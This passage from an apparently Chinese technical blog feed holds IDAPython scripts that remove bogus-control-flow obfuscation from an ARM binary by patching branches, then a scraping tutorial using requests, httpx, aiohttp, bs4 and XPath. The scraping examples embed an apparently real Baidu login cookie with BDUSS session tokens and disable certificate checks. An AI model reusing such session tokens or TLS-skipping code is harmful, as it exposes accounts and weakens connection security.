mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> start + <span class="number">4</span></span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;ORR&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 17</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> start + <span class="number">4</span></span><br><span class="line">        val_1 = idc.get_operand_value(ea, <span class="number">1</span>)</span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;CMP&#x27;</span> <span class="keyword">and</span> val_1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> mnem == <span class="string">&#x27;B.EQ&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">hex</span>(ea))</span><br><span class="line">                idc.patch_dword(ea, nop)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ea</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_bcf_func</span>(<span class="params">func_start</span>):</span><br><span class="line">    func_end = idc.find_func_end(func_start) <span class="comment">#获取这个开始地址的函数的结束地址</span></span><br><span class="line">    <span class="keyword">if</span> func_end == idc.BADADDR:    //到达<span class="keyword">return</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    ea = func_start</span><br><span class="line">    <span class="keyword">while</span> ea &lt; func_end:</span><br><span class="line">        ea = find_bcf(ea, func_end)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">patch_bcf_func(<span class="number">0x88060</span>)</span><br></pre></td></tr></table></figure><p>还有一种办法把这两个变量改为可读不可写，ida即可优化编译</p><p>跟进这两个变量，<img src="assets/image-20241202220610715.png" alt="image-20241202220610715"></p><p>发现在bss段，为了不影响bss段其他变量的属性，</p><p>ctrl+s<img src="assets/image-20241202220650849.png" alt="image-20241202220650849"></p><p>发现这两个变量正好在bss末端 靠近prgend段</p><p>把这两个变量搞到prgend段，然后让他们两个可读就好了，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify_segment</span>():</span><br><span class="line">    idc.set_segment_bounds(<span class="number">0xC0118</span>, idc.get_segm_start(<span class="number">0xC0118</span>), <span class="number">0xC0118</span>, idc.SEGMOD_SILENT)   <span class="comment">#bss段 末地址改为0xC0118</span></span><br><span class="line">     <span class="comment">#prgend地址改为[0xC0118, 0xC0149)</span></span><br><span class="line">    idc.set_segment_bounds(<span class="number">0xC0148</span>, <span class="number">0xC0118</span>, <span class="number">0xC0149</span>, idc.SEGMOD_SILENT)</span><br><span class="line">    idc.set_segm_attr(<span class="number">0xC0148</span>, idc.SEGATTR_PERM, <span class="number">4</span>) <span class="comment">#把0xc0148所属段属性改为可读</span></span><br><span class="line">    idc.patch_dword(<span class="number">0xC0118</span>, <span class="number">0</span>)    <span class="comment">#把变量值改为0 让判断始终false</span></span><br><span class="line">    idc.patch_dword(<span class="number">0xC0120</span>, <span class="number">0</span>)    <span class="comment">#把变量值改为0 让判断始终false</span></span><br><span class="line"> </span><br><span class="line">modify_segment()</span><br></pre></td></tr></table></figure><p>反混淆bcf后再次进入这个函数sub_88060，<img src="assets/image-20241202221138359.png" alt="image-20241202221138359"></p><p>变为switch和多个case语句 ==》 fla</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>爬虫</h1><ul><li>requests的session使用<br>httpx的session与其类似</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#session里边写一些共有得东西</span></span><br><span class="line"><span class="comment">#每一个基于session得请求是独立的</span></span><br><span class="line"><span class="comment">#如果覆盖了共有的信息，那就会更新，如果共有的没有，那就添加</span></span><br><span class="line"></span><br><span class="line">session=requests.Session()</span><br><span class="line">session.headers=&#123;<span class="string">&#x27;common&#x27;</span>:<span class="string">&#x27;xjb&#x27;</span>,<span class="string">&#x27;test&#x27;</span>:<span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">html1=session.get(<span class="string">&#x27;https://httpbin.org/headers&#x27;</span>,headers=&#123;<span class="string">&#x27;test&#x27;</span>:<span class="string">&quot;my headers&quot;</span>&#125;,verify=<span class="literal">False</span>)  <span class="comment">#verify=False 忽证书校验报错</span></span><br><span class="line"><span class="built_in">print</span>(html1.text)</span><br><span class="line"><span class="built_in">print</span>(html1.headers)</span><br><span class="line"><span class="built_in">print</span>(html1.request.headers)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://httpbin.org/post&#x27;</span></span><br><span class="line">multiple_files = [</span><br><span class="line">     (<span class="string">&#x27;xxx&#x27;</span>, (<span class="string">&#x27;test.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;test.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">r = requests.post(url, files=multiple_files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#本地全局代理时，添加如下：</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://112.250.107.37:53281&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://12.250.107.37:53281&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html=requests.get(<span class="string">&#x27;https://github.com/&#x27;</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(html.text)</span><br></pre></td></tr></table></figure><ul><li><p>异步爬虫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http://&quot;</span>: <span class="string">&quot;http://localhost:7890&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://&quot;</span>: <span class="string">&quot;http://localhost:7890&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">spider</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;启动&#x27;</span>,num)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient(http2=<span class="literal">True</span>,proxies=proxies) <span class="keyword">as</span> client:</span><br><span class="line">        html=<span class="keyword">await</span> client.get(<span class="string">&#x27;https://www.python-httpx.org/&#x27;</span>,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(html)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*[spider(<span class="number">1</span>),spider(<span class="number">2</span>),spider(<span class="number">3</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure></li><li><p>发送http2请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http://&quot;</span>: <span class="string">&quot;http://localhost:7890&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://&quot;</span>: <span class="string">&quot;http://localhost:7890&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">client=httpx.Client(http2=<span class="literal">True</span>,proxies=proxies) </span><br><span class="line">html=client.get(<span class="string">&quot;https://www.python-httpx.org/&quot;</span>,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(html.text)</span><br></pre></td></tr></table></figure></li><li><p>aiohttp异步请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy=<span class="string">&#x27;http://localhost:7890&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession()<span class="keyword">as</span> client:</span><br><span class="line">        html=<span class="keyword">await</span> client.get(<span class="string">&#x27;https://docs.aiohttp.org/en/stable/&#x27;</span>,proxy=proxy,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(<span class="keyword">await</span> html.text())</span><br><span class="line">        html.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#aiohttp与asyncio兼容不好，asyncio改下策略则不报错，如下：        </span></span><br><span class="line">asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())</span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></li><li><p>bs4解析库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://www.baidu.com/s?wd=python&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;BIDUPSID=5B1DFD3B99B5065DF1522F28819214A1; PSTM=1655266634; sug=0; sugstore=0; BAIDUID=5B1DFD3B99B5065DE2679BE9363853F4:SL=0:NR=10:FG=1; ORIGIN=2; bdime=0; BD_UPN=12314753; BDUSS=FjdE1JMlRSaG9JQ1lKVzRqb2tZSUQ1VDlySTlzczA1UE84ZVZrLTNLc2xzSzVqRVFBQUFBJCQAAAAAAAAAAAEAAAB-NgnqTG9zZU5pbmUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACUjh2MlI4djVV; BDUSS_BFESS=FjdE1JMlRSaG9JQ1lKVzRqb2tZSUQ1VDlySTlzczA1UE84ZVZrLTNLc2xzSzVqRVFBQUFBJCQAAAAAAAAAAAEAAAB-NgnqTG9zZU5pbmUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACUjh2MlI4djVV; H_PS_PSSID=37781_36558_37557_37906_36802_37927_37759_37901_26350_37788_37881; BDRCVFR[feWj1Vr5u3D]=I67x6TjHwwYf0; delPer=0; PSINO=2; BAIDUID_BFESS=5B1DFD3B99B5065DE2679BE9363853F4:SL=0:NR=10:FG=1; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; BA_HECTOR=85808g0g84202g25al25a4nk1hp8kjk1g; ZFY=ouVq3lqZ3vGr5vvxToXTzY3:AUOE:B7MMjbbpyBNa3YHs:C; B64_BOT=1; BD_CK_SAM=1; Hm_lvt_aec699bb6442ba076c8981c6dc490771=1669205558,1670065546,1670664897; RT=&quot;z=1&amp;dm=baidu.com&amp;si=s43l5qiay2f&amp;ss=lbhreezm&amp;sl=0&amp;tt=0&amp;bcn=https%3A%2F%2Ffclog.baidu.com%2Flog%2Fweirwood%3Ftype%3Dperf&amp;ul=vg&amp;hd=ya&quot;; ab_sr=1.0.1_NGNjMmNiODQzZWQyOWE1MDA5N2M1NjhkZDVlMzJkNTlkMTU3NmRjNmFhMWRjZDg1MmZhMDU5NmIxMTIxNWJmYmE3Y2Q4NjhkZDkxZTA2NjIxNmVkYzM0OThhZjRiY2ZiNzIwMWNkMmRkNzJiZGJjNzIzOTA0NTRiZTA2ODU2MDU2Mzg3ZmI1NDk3NWIwMTU5MjgxZGQ2ZGU2Y2RkMzFkODdjNGY3ZjkxNzZjYjQ4MzlkNjhhODA0YjI3NWE4NzE2; shifen[357772686099_3550]=1670666012; BCLID=10045372974471067391; BCLID_BFESS=10045372974471067391; BDSFRCVID=EFkOJeC62lzoAlJjrbI8Uwp7b779G63TH6aV3a3cCtV3rB9_bdLiEG0PKx8g0K4bIVxMogKKyeOTHuDF_2uxOjjg8UtVJeC6EG0Ptf8g0f5; BDSFRCVID_BFESS=EFkOJeC62lzoAlJjrbI8Uwp7b779G63TH6aV3a3cCtV3rB9_bdLiEG0PKx8g0K4bIVxMogKKyeOTHuDF_2uxOjjg8UtVJeC6EG0Ptf8g0f5; H_BDCLCKID_SF=tJ-DoIDytC03qR5gMJ5q-n3HKUrL5t_XbI6y3JjOHJOoDDvHQ4Rcy4LdjG5QhtRCagQBQJoYfU5bqK3PjTtBQT5y3-Aq5lKeKR725-bCt-oIbf7PbMvEQfbQ0-ROqP-jWbnaaxQyBR7JOpvwbfnxybLvQRPH-Rv92DQMVU52QqcqEIQHQT3m5-5bbN3ht6T2-DA_oC8-fC5P; H_BDCLCKID_SF_BFESS=tJ-DoIDytC03qR5gMJ5q-n3HKUrL5t_XbI6y3JjOHJOoDDvHQ4Rcy4LdjG5QhtRCagQBQJoYfU5bqK3PjTtBQT5y3-Aq5lKeKR725-bCt-oIbf7PbMvEQfbQ0-ROqP-jWbnaaxQyBR7JOpvwbfnxybLvQRPH-Rv92DQMVU52QqcqEIQHQT3m5-5bbN3ht6T2-DA_oC8-fC5P; H_PS_645EC=b855dTiWQHLnUFNnBWoZIPvHebTwUp2rk0bcZT1nJ1OBxOTZhf8vsjFWwKw; baikeVisitId=c00dd38a-3922-4046-8e1a-ec69d06f40b6; BDSVRTM=250; Hm_lpvt_aec699bb6442ba076c8981c6dc490771=1670666544; COOKIE_SESSION=9_1_8_8_16_53_0_3_6_6_165_28_678311_0_173_0_1670666553_1670665412_1670666380%7C9%233446414_6_1670664833%7C3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">html=requests.get(url,headers=headers)</span><br><span class="line">html.encoding=<span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="comment">#print(html.text)</span></span><br><span class="line">soup=BeautifulSoup(html.text,<span class="string">&#x27;lxml&#x27;</span>)  <span class="comment">#进行解析</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">CSS选择器  class .    id #   写标签</span></span><br><span class="line"><span class="string">父标签在前  子 孙子标签在后</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">results=soup.select(<span class="string">&#x27;div.c-container.xpath-log.new-pmd h3 a&#x27;</span>) <span class="comment">#根据标签等定位，</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span>(r.text.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),r[<span class="string">&#x27;href&#x27;</span>])</span><br></pre></td></tr></table></figure></li><li><p>xpath查找法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://www.baidu.com/s?wd=python&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;BIDUPSID=5B1DFD3B99B5065DF1522F28819214A1; PSTM=1655266634; sug=0; sugstore=0; BAIDUID=5B1DFD3B99B5065DE2679BE9363853F4:SL=0:NR=10:FG=1; ORIGIN=2; bdime=0; BD_UPN=12314753; BDUSS=FjdE1JMlRSaG9JQ1lKVzRqb2tZSUQ1VDlySTlzczA1UE84ZVZrLTNLc2xzSzVqRVFBQUFBJCQAAAAAAAAAAAEAAAB-NgnqTG9zZU5pbmUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACUjh2MlI4djVV; BDUSS_BFESS=FjdE1JMlRSaG9JQ1lKVzRqb2tZSUQ1VDlySTlzczA1UE84ZVZrLTNLc2xzSzVqRVFBQUFBJCQAAAAAAAAAAAEAAAB-NgnqTG9zZU5pbmUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACUjh2MlI4djVV; H_PS_PSSID=37781_36558_37557_37906_36802_37927_37759_37901_26350_37788_37881; BDRCVFR[feWj1Vr5u3D]=I67x6TjHwwYf0; delPer=0; PSINO=2; BAIDUID_BFESS=5B1DFD3B99B5065DE2679BE9363853F4:SL=0:NR=10:FG=1; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; BA_HECTOR=85808g0g84202g25al25a4nk1hp8kjk1g; ZFY=ouVq3lqZ3vGr5vvxToXTzY3:AUOE:B7MMjbbpyBNa3YHs:C; B64_BOT=1; BD_CK_SAM=1; Hm_lvt_aec699bb6442ba076c8981c6dc490771=1669205558,1670065546,1670664897; RT=&quot;z=1&amp;dm=baidu.com&amp;si=s43l5qiay2f&amp;ss=lbhreezm&amp;sl=0&amp;tt=0&amp;bcn=https%3A%2F%2Ffclog.baidu.com%2Flog%2Fweirwood%3Ftype%3Dperf&amp;ul=vg&amp;hd=ya&quot;; ab_sr=1.0.1_NGNjMmNiODQzZWQyOWE1MDA5N2M1NjhkZDVlMzJkNTlkMTU3NmRjNmFhMWRjZDg1MmZhMDU5NmIxMTIxNWJmYmE3Y2Q4NjhkZDkxZTA2NjIxNmVkYzM0OThhZjRiY2ZiNzIwMWNkMmRkNzJiZGJjNzIzOTA0NTRiZTA2ODU2MDU2Mzg3ZmI1NDk3NWIwMTU5MjgxZGQ2ZGU2Y2RkMzFkODdjNGY3ZjkxNzZjYjQ4MzlkNjhhODA0YjI3NWE4NzE2; shifen[357772686099_3550]=1670666012; BCLID=10045372974471067391; BCLID_BFESS=10045372974471067391; BDSFRCVID=EFkOJeC62lzoAlJjrbI8Uwp7b779G63TH6aV3a3cCtV3rB9_bdLiEG0PKx8g0K4bIVxMogKKyeOTHuDF_2uxOjjg8UtVJeC6EG0Ptf8g0f5; BDSFRCVID_BFESS=EFkOJeC62lzoAlJjrbI8Uwp7b779G63TH6aV3a3cCtV3rB9_bdLiEG0PKx8g0K4bIVxMogKKyeOTHuDF_2uxOjjg8UtVJeC6EG0Ptf8g0f5; H_BDCLCKID_SF=tJ-DoIDytC03qR5gMJ5q-n3HKUrL5t_XbI6y3JjOHJOoDDvHQ4Rcy4LdjG5QhtRCagQBQJoYfU5bqK3PjTtBQT5y3-Aq5lKeKR725-bCt-oIbf7PbMvEQfbQ0-ROqP-jWbnaaxQyBR7JOpvwbfnxybLvQRPH-Rv92DQMVU52QqcqEIQHQT3m5-5bbN3ht6T2-DA_oC8-fC5P; H_BDCLCKID_SF_BFESS=tJ-DoIDytC03qR5gMJ5q-n3HKUrL5t_XbI6y3JjOHJOoDDvHQ4Rcy4LdjG5QhtRCagQBQJoYfU5bqK3PjTtBQT5y3-Aq5lKeKR725-bCt-oIbf7PbMvEQfbQ0-ROqP-jWbnaaxQyBR7JOpvwbfnxybLvQRPH-Rv92DQMVU52QqcqEIQHQT3m5-5bbN3ht6T2-DA_oC8-fC5P; H_PS_645EC=b855dTiWQHLnUFNnBWoZIPvHebTwUp2rk0bcZT1nJ1OBxOTZhf8vsjFWwKw; baikeVisitId=c00dd38a-3922-4046-8e1a-ec69d06f40b6; BDSVRTM=250; Hm_lpvt_aec699bb6442ba076c8981c6dc490771=1670666544; COOKIE_SESSION=9_1_8_8_16_53_0_3_6_6_165_28_678311_0_173_0_1670666553_1670665412_1670666380%7C9%233446414_6_1670664833%7C3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">html=requests.get(url,headers=headers)</span><br><span class="line">html.encoding=<span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="comment">#print(html.text)</span></span><br><span class="line">soup=etree.HTML(html.text)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">// ==》 从当前节点或者当前节点得子节点开始查找</span></span><br><span class="line"><span class="string">/ ==》  从当前节点开始查找</span></span><br><span class="line"><span class="string">//div[@class=&quot;result c-container xpath-log new-pmd&quot;] 严格匹配 必须从头到尾一摸一样@可以是任意属性</span></span><br><span class="line"><span class="string">//div[contains(@class,&quot;c-container xpath-log new-pmd&quot;)] 只要包含就可以</span></span><br><span class="line"><span class="string">//div[starts-with(@class,&quot;result&quot;)]  以什么开头</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/text() 获取当前节点的文本</span></span><br><span class="line"><span class="string">/string() 获取当前节点以及节点之下的节点中的文字</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@href  @data-click  列表  [0]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">results=soup.xpath(<span class="string">&#x27;//div[contains(@class,&quot;c-container xpath-log new-pmd&quot;)]//h3/a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果直接输出r ==》 &lt;Element a at 0x204c23f3bc0&gt; </span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span>(r.xpath(<span class="string">&#x27;string()&#x27;</span>),r.xpath(<span class="string">&quot;@href&quot;</span>),r.xpath(<span class="string">&quot;@data-click&quot;</span>)) <span class="comment"># @+属性</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>正则表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">DOM HTML  CSS XPATH</span></span><br><span class="line"><span class="string">JS  CSS   re   使用正则</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.*?  非贪婪匹配</span></span><br><span class="line"><span class="string">.*  贪婪匹配</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I 忽略大小写 M 多行模式</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">mytext=re.<span class="built_in">compile</span>(<span class="string">&#x27;eArea&quot;:&#123;&quot;text&quot;:&quot;(.*?)&quot;&#125;,&quot;excerptA&#x27;</span>,re.S|re.I|re.M)</span><br><span class="line">mypng=re.<span class="built_in">compile</span>(<span class="string">&#x27;&quot;imageArea&quot;:&#123;&quot;url&quot;:&quot;(.*?)&quot;&#125;,&quot;metricsArea&quot;&#x27;</span>,re.S|re.I|re.M)</span><br><span class="line">myhot=re.<span 